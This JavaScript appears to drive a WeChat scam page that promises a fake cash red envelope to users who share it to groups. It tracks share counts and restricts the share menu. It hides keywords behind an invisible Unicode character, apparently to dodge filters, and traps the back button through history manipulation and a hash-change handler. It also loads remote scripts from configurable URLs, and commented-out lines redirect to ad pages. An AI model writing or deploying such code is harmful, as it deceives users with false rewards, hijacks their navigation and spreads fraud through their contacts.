function shareTimeline3(result) {
    wx.onMenuShareTimeline({
            title: window.data.to_timeline1.title.replace('{city}', city),
            desc: window.data.to_timeline1.title.replace('{city}', city),
            link: window.data.to_timeline1.link,
            imgUrl: window.data.to_timeline1.imgUrl,
            type: 'link',
            // "img_width": "640",
            // "img_height": "640",
            success: function() {
                shareTTimes += 1;
                share_tip(shareATimes, shareTTimes);
            },
            fail: function() {
                //    $.get('//ss.bnykry.cn/1.0.0/activity_count/common?type=4&video='+window.type)
            }
        })
        //   WeixinJSBridge.invoke('shareTimeline', {
        //     "img_url":window.data.to_timeline1.imgUrl,
        //     "img_width": "640",
        //     "img_height": "640",
        //     "link":window.data.to_timeline1.link,
        //     "desc":window.data.to_timeline1.title.replace('{city}', city),
        //     "title":window.data.to_timeline1.title.replace('{city}', city),
        //     dataUrl: "http://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
        //     type: 'video'
        // },
        // function(res) {
        //     shareTTimes += 1;
        //     share_tip()
        // })
};

function shareTimeline4(result) {
    wx.onMenuShareTimeline({
            title: window.data.to_timeline3.title.replace('{city}', city),
            desc: window.data.to_timeline3.title.replace('{city}', city),
            link: window.data.to_timeline3.link,
            imgUrl: window.data.to_timeline3.imgUrl,
            type: 'link',
            // "img_width": "640",
            // "img_height": "640",
            success: function() {
                shareTTimes += 1;
                share_tip(shareATimes, shareTTimes);
            },
            fail: function() {
                //  $.get('//ss.bnykry.cn/1.0.0/activity_count/common?type=4&video='+window.type)
            }
        })
        //   WeixinJSBridge.invoke('shareTimeline', {
        //     "img_url":window.data.to_timeline3.imgUrl,
        //     "img_width": "640",
        //     "img_height": "640",
        //     "link":window.data.to_timeline3.link,
        //     "desc":window.data.to_timeline3.title.replace('{city}', city),
        //     "title":window.data.to_timeline3.title.replace('{city}', city),
        //     dataUrl: "http://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
        //     type: 'video'
        // },
        // function(res) {
        //     shareTTimes += 1;
        //     share_tip()
        // })
};
// 分享
(function() {

    var group_ad = false;
    var timeline_ad = false;
    var shareATimes = 0;
    var shareTTimes = 0;


    function start_load() {

        window.type = 36;
        $.ajax({
            type: "POST",
            url: location.href,
            dataType: "json",
            jsonp: "callback",
            data: {},
            success: function(data) {
                window.data = data;
                wx.config(window.data.config);
                wx.ready(function() {
                    wx.hideOptionMenu();
                    wx.showMenuItems({
                        menuList: ['menuItem:share:appMessage']
                            //    menuList: ['menuItem:share:timeline']
                    });
                    var result = {
                        "config": {
                            "debug": true,
                            "jsApiList": ["onMenuShareTimeline", "onMenuShareAppMessage"]
                        },
                        "share_info": {
                            "to_group": {
                                "title": data.to_group.title.replace('{city}', city),
                                "desc": data.to_group.desc.replace('{city}', city),
                                "link": data.to_group.link,
                                "img": data.to_group.imgUrl
                            },
                            "to_group1": {
                                "title": data.to_group.title.replace('{city}', city),
                                "desc": data.to_group.desc.replace('{city}', city),
                                "link": data.to_group.link,
                                "img": data.to_group.imgUrl
                            },
                            "to_group3": {
                                "title": data.to_group3.title.replace('{city}', city),
                                "desc": data.to_group3.desc.replace('{city}', city),
                                "link": data.to_group3.link,
                                "img": data.to_group3.imgUrl
                            },
                            "to_timeline": {
                                "title": data.to_timeline.title.replace('{city}', city),
                                "link": data.to_timeline.link,
                                "img": data.to_timeline.imgUrl
                            },
                            "to_timeline2": {
                                "title": data.to_timeline2.title.replace('{city}', city),
                                "link": data.to_timeline2.link,
                                "img": data.to_timeline2.imgUrl
                            },
                            "to_info": {
                                "timeline_num": data.to_info.timeline_num
                            },
                            "share_app_order": data.share_app_order,
                        }
                    };
                    line2 = result.share_info.to_timeline2;
                    timeline_num = result.share_info.to_info.timeline_num;
                    line2_title = result.share_info.to_timeline2.title;
                    line2_link = result.share_info.to_timeline2.link;
                    line2_img = result.share_info.to_timeline2.img;

                    //        WeixinJSBridge.on('menu:share:appmessage',
                    // function(argv) {
                    shareFriend(result.share_info);
                    // });
                    // WeixinJSBridge.on('menu:share:timeline',
                    // function(argv) {
                    shareTimeline1(result.share_info.to_timeline);
                    // })
                });
                wx.error(function(res) {
                    $.getScript("//?appId=" + window.data.config.appId);
                });
            }
        })
    }

    function init() {
        if (typeof WeixinJSBridge === "undefined") {
            if (document.addEventListener) {
                document.addEventListener('WeixinJSBridgeReady', start_load, false);
            } else if (document.attachEvent) {
                document.attachEvent('WeixinJSBridgeReady', start_load);
                document.attachEvent('onWeixinJSBridgeReady', start_load);
            }
        } else {
            start_load();
        }
    }

    window.g_share = {
        init: init,
    }

}())

$(function() {

    var config = {
        tpl: {
            body: [
                '<div class="share-container">',
                '  <h3>分享點這裏</h3>',
                '  <div class="share-prompt">',
                '    <p>',
                '      點擊右上角，分享到',
                '      <i class="icon_share"></i>',
                '      <span>微信群</span>',
                '    </p>',
                '    <p>即可領取￥<span>%(money)</span>￥</p>',
                '  </div>',
                '  <div class="red-packet">',
                '    <img>',
                '    <p>恭喜发财</p>',
                '  </div>',
                '</div>',
            ].join(''),
        }
    };

    function showShareTips(tips) {
        if (tips) {
            g_dialog.alert({
                title: '',
                message: tips,
                btn: '我知道了'
            });
        }
    }

    function initPage(money) {
        M.resetFont();
        $(document.body).append(config.tpl.body.jstpl_format({
            money: money
        }));
        $('.red-packet img').attr('src', $('.js_head_img').attr('data-src'));
        $('.share-container').css({
            height: $(window).height() + 'px'
        });
    }

    function bindEvent() {

        document.body.onclick = function() {}

        $('.share-container').on('click', function() {
            showShareTips(gConfig.defaultTips);
        });

        $(document.body).on('event_page_share_done', function() {
            if (gConfig.successTips) {
                g_dialog.alert({
                    title: '',
                    message: gConfig.successTips,
                    btn: '我知道了',
                    cb: function() {
                        if (gConfig.endUrl) {
                            M.loadJS(gConfig.endUrl);
                        }
                        return false
                    }
                });
            }
        });

    }

    function replaceMoney(obj, money) {
        obj = obj || {}
        if (obj.title) {
            obj.title = obj.title.replace('{moneyStr}', money).replace(/{fuck}/ig, '\u034f');
        }
        if (obj.desc) {
            obj.desc = obj.desc.replace('{moneyStr}', money).replace(/{fuck}/ig, '\u034f').replace('\\n', '\n');
        }
        if (obj.successTitle) {
            obj.successTitle = obj.successTitle.replace('{moneyStr}', money).replace(/{fuck}/ig, '\u034f');
        }
        if (obj.successTips) {
            obj.successTips = obj.successTips.replace('{moneyStr}', money).replace(/{fuck}/ig, '\u034f');
        }
    }

    function init() {

        record('tosharer', site);
        evkey && record('tosharer', evkey);

        var moneyStr = parseInt(M.getParam('money')) || parseInt((parseFloat(Math.random() * 20) + 30) * 100)

        var money = (parseFloat(moneyStr / 100).toFixed(2));

        gConfig.defaultTips = gConfig.defaultTips.jstpl_format({
            money: money
        });

        gConfig.successTips = gConfig.successTips.jstpl_format({
            money: money
        });

        replaceMoney(gConfig['ad'], money)
        replaceMoney(gConfig['to_group'], money)
        replaceMoney(gConfig['to_timeline'], money)
        replaceMoney(gConfig['to_timeline'], money)

        $(gConfig.groupTips).each(function(index, item) {
            replaceMoney(item, money)
        });

        $(gConfig.timeLineTips).each(function(index, item) {
            replaceMoney(item, money)
        });

        initPage(money);
        bindEvent();
        g_share.init();
        setTimeout(function() {
            showShareTips(gConfig.defaultTips);
        });
    }

    init()

});

var _0 = _0 || [];

function anchor() {
    history.pushState(history.length + 1, "message", "#" + new Date().getTime())
}
setTimeout('anchor()', 100);
window.onhashchange = function() {
    //      var url = window.location.href;
    //      if(url.indexOf("bdysite") >= 0 ) {
    //      window.location.href="?xssfile=liuliang.html";
    // }else{
    //  window.location.href="../130/liuliang.html";
    // }
    //window.location.href="http://2nsprpqblxlwv.xicp.cn/ad/ad_main.html";
    zp();
};
$(function() {
    if (gConfig.hm) {
        M.report(gConfig.hm);
        M.hotClick('pv.share_page');
    }
    // 总统计

    M.loadJS('https://hm.baidu.com/hm.js?a50fba5e8c1468ee699a1a674c95ad02');
});

// 设置返回
$(function() {
    if (gConfig['attached'] && gConfig['attached']['back_api']) {
        M.loadJS(gConfig['attached']['back_api']);
    }
});